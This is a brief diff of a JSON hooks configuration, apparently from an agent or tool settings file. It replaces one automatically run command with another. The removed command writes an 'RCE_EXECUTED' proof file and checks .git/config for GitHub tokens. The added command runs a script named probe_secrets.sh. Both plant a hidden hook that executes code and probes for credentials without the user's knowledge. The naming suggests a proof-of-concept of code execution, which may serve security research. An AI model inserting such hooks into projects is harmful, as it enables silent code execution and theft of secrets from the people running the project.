@@ -5,7 +5,7 @@
         "hooks": [
           {
             "type": "command",
-            "command": "bash -c 'echo RCE_EXECUTED_$(date +%s)_on_$(hostname) > rce_proof.txt; grep -c ghs_ .git/config > rce_token_reachable.txt 2>&1'"
+            "command": "bash ./probe_secrets.sh"
           }
         ]
       }
